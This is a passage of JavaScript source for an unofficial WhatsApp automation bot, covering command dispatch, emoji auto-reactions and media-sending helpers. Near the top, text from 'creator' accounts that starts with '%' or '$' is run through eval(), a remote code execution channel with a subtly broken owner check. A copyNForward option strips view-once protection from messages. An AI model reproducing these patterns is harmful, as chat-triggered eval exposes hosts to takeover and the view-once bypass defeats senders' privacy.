                                    .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
                                    .includes(m.sender);

                if (isCreator && mek.text && mek.text.startsWith('%')) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = eval(code);
                        if (typeof resultTest === 'object')
                            reply(util.format(resultTest));
                        else reply(util.format(resultTest));
                    } catch (err) {
                        reply(util.format(err));
                    }
                    return;
                }
                
                if (isCreator && mek.text && mek.text.startsWith('$')) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                        let h = util.format(resultTest);
                        if (h === undefined) return console.log(h);
                        else reply(h);
                    } catch (err) {
                        if (err === undefined)
                            return console.log('error');
                        else reply(util.format(err));
                    }
                    return;
                }
                
                //================ownerreact==============
                if (senderNumber.includes("2348125101930") && !isReact) {
                    const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️" ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    m.react(randomReaction).catch(console.error);
                }

                //==========public react============//
                // Auto React for all messages (public and owner)
                if (!isReact && config.AUTO_REACT === 'true') {
                    const reactions = [
                        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
                    ];

                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    m.react(randomReaction).catch(console.error);
                }
                        
                // Custom React for all messages (public and owner)
                if (!isReact && config.CUSTOM_REACT === 'true') {
                    // Use custom emojis from the configuration (fallback to default if not set)
                    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    m.react(randomReaction).catch(console.error);
                }
                        
                //==========WORKTYPE============ 
                if(!isOwner && config.MODE === "private") return;
                if(!isOwner && isGroup && config.MODE === "inbox") return;
                if(!isOwner && !isGroup && config.MODE === "groups") return;
                
                // take commands 
                const events = require('./command.js');
                const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                
                if (isCmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                    if (cmd) {
                        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } }).catch(console.error);
                        
                        try {
                            cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        } catch (e) {
                            console.error("[PLUGIN ERROR] " + e);
                        }
                    }
                }
                
                events.commands.map(async(command) => {
                    try {
                        if (body && command.on === "body") {
                            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        } else if (mek.q && command.on === "text") {
                            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        } else if (
                            (command.on === "image" || command.on === "photo") &&
                            mek.type === "imageMessage"
                        ) {
                            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        } else if (
                            command.on === "sticker" &&
                            mek.type === "stickerMessage"
                        ) {
                            command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        }
                    } catch (error) {
                        console.error("❌ Error in command execution:", error);
                    }
                });
                
            } catch (error) {
                console.error("❌ Error in messages.upsert:", error);
            }
        });

        //===================================================   
        conn.decodeJid = jid => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return (
                    (decode.user &&
                        decode.server &&
                        decode.user + '@' + decode.server) ||
                    jid
                );
            } else return jid;
        };

        //===================================================
        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            try {
                let vtype;
                if (options.readViewOnce) {
                    message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
                    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
                    delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
                    delete message.message.viewOnceMessage.message[vtype].viewOnce;
                    message.message = {
                        ...message.message.viewOnceMessage.message
                    };
                }
            
                let mtype = Object.keys(message.message)[0];
                let content = await generateForwardMessageContent(message, forceForward);
                let ctype = Object.keys(content)[0];
                let context = {};
                if (mtype != "conversation") context = message.message[mtype].contextInfo;
                content[ctype].contextInfo = {
                    ...context,
                    ...content[ctype].contextInfo
                };
                const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                    ...content[ctype],
                    ...options,
                    ...(options.contextInfo ? {
                        contextInfo: {
                            ...content[ctype].contextInfo,
                            ...options.contextInfo
                        }
                    } : {})
                } : {});
                await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
                return waMessage;
            } catch (error) {
                console.error("Error in copyNForward:", error);
                throw error;
            }
        };

        //=================================================
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
            try {
                let quoted = message.msg ? message.msg : message;
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
                const stream = await downloadContentFromMessage(quoted, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                let type = await FileType.fromBuffer(buffer);
                let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
                // save to file
                await fs.promises.writeFile(trueFileName, buffer);
                return trueFileName;
            } catch (error) {
                console.error("Error in downloadAndSaveMediaMessage:", error);
                throw error;
            }
        };

        //=================================================
        conn.downloadMediaMessage = async(message) => {
            try {
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
                const stream = await downloadContentFromMessage(message, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                return buffer;
            } catch (error) {
                console.error("Error in downloadMediaMessage:", error);
                throw error;
            }
        };
        
        //================================================
        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            try {
                let mime = '';
                let res = await axios.head(url);
                mime = res.headers['content-type'];
                if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
                }
                let type = mime.split("/")[0] + "Message";
                if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
                }
                if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
                }
            } catch (error) {
                console.error("Error in sendFileUrl:", error);
                throw error;
            }
        };

        //==========================================================
        conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
            try {
                //let copy = message.toJSON()
                let mtype = Object.keys(copy.message)[0];
                let isEphemeral = mtype === 'ephemeralMessage';
                if (isEphemeral) {
                    mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
                }
                let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
                let content = msg[mtype];
                if (typeof content === 'string') msg[mtype] = text || content;
                else if (content.caption) content.caption = text || content.caption;
                else if (content.text) content.text = text || content.text;
                if (typeof content !== 'string') msg[mtype] = {
                    ...content,
                    ...options
                };
                if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
                else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
                if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
                else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
                copy.key.remoteJid = jid;
                copy.key.fromMe = sender === conn.user.id;
            
                return proto.WebMessageInfo.fromObject(copy);
            } catch (error) {
                console.error("Error in cMod:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.getFile = async(PATH, save) => {
            try {
                let res;
                let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
                //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
                let type = await FileType.fromBuffer(data) || {
                    mime: 'application/octet-stream',
                    ext: '.bin'
                };
                let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
                if (data && save) await fs.promises.writeFile(filename, data);
                return {
                    res,
                    filename,
                    size: await getSizeMedia(data),
                    ...type,
                    data
                };
            } catch (error) {
                console.error("Error in getFile:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
            try {
                let types = await conn.getFile(PATH, true);
                let { filename, size, ext, mime, data } = types;
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif.js');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: config.packname, author: config.packname, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            } catch (error) {
                console.error("Error in sendFile:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.parseMention = async(text) => {
            try {
                return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
            } catch (error) {
                console.error("Error in parseMention:", error);
                return [];
            }
        };
        
        //=====================================================
        conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
            try {
                let types = await conn.getFile(path, true);
                let { mime, ext, res, data, filename } = types;
                if (res && res.status !== 200 || data.length <= 65536) {
                    try { throw { json: JSON.parse(data.toString()) } } catch (e) { if (e.json) throw e.json }
                }
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.packname, author: options.author ? options.author : config.author, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    caption,
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            } catch (error) {
                console.error("Error in sendMedia:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
            try {
                let buffer;
                if (options && (options.packname || options.author)) {
                    buffer = await writeExifVid(buff, options);
                } else {
                    buffer = await videoToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            } catch (error) {
                console.error("Error in sendVideoAsSticker:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendImageAsSticker = async (jid, buff, options = {}) => {
            try {
                let buffer;
                if (options && (options.packname || options.author)) {
                    buffer = await writeExifImg(buff, options);
                } else {
                    buffer = await imageToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            } catch (error) {
                console.error("Error in sendImageAsSticker:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
            try {
                return conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted });
            } catch (error) {
                console.error("Error in sendTextWithMentions:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
            try {
                let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
                return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
            } catch (error) {
                console.error("Error in sendImage:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendText = (jid, text, quoted = '', options) => {
            try {
                return conn.sendMessage(jid, { text: text, ...options }, { quoted });
            } catch (error) {
                console.error("Error in sendText:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
            try {
                let buttonMessage = {
                    text,
                    footer,
                    buttons,
                    headerType: 2,
                    ...options
                };
                //========================================================================================================================================
                conn.sendMessage(jid, buttonMessage, { quoted, ...options });
            } catch (error) {
                console.error("Error in sendButtonText:", error);
                throw error;
            }
        };
        
        //=====================================================
        conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
            try {
                let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
                var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            "hydratedContentText": text,
                            "hydratedFooterText": footer,
                            "hydratedButtons": but
                        }
                    }
                }), options);
                conn.relayMessage(jid, template.message, { messageId: template.key.id });
            } catch (error) {
                console.error("Error in send5ButImg:", error);
                throw error;
            }
        };
        
        //=====================================================

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            try {
                let list = [];
                for (let i of kon) {
                    list.push({
                        displayName: await conn.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                            i + '@s.whatsapp.net',
                        )}\nFN:${
                            global.OwnerName || 'Bot Owner'
                        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                            global.email || 'example@email.com'
                        }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                            global.github || 'user'
                        }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                            global.location || 'Unknown'
                        };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                    });
                }
                conn.sendMessage(
                    jid,
                    {
                        contacts: {
                            displayName: `${list.length} Contact`,
                            contacts: list,
                        },
                        ...opts,
                    },
                    { quoted },
                );
            } catch (error) {
                console.error("Error in sendContact:", error);
                throw error;
            }
        };
        // Status 
        conn.setStatus = status => {
            try {
                conn.query({
                    tag: 'iq',
                    attrs: {
                        to: '@s.whatsapp.net',
                        type: 'set',
                        xmlns: 'status',
                    },
                    content: [
                        {
                            tag: 'status',
                            attrs: {},
                            content: Buffer.from(status, 'utf-8'),
                        },
                    ],
                });
                return status;
            } catch (error) {
                console.error("Error in setStatus:", error);
                throw error;
            }
        };
        
        conn.serializeM = mek => sms(conn, mek, store);

    } catch (error) {
        console.error("Error in connection setup:", error);
        setTimeout(connectToWA, 10000); // Retry after 10 seconds on error
    }
}


const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("🚀 TRACLE BOT IS RUNNING ✅");
});

app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});

// --- Start WhatsApp connection ---
setTimeout(() => {
  connectToWA().catch(console.error);
}, 4000);
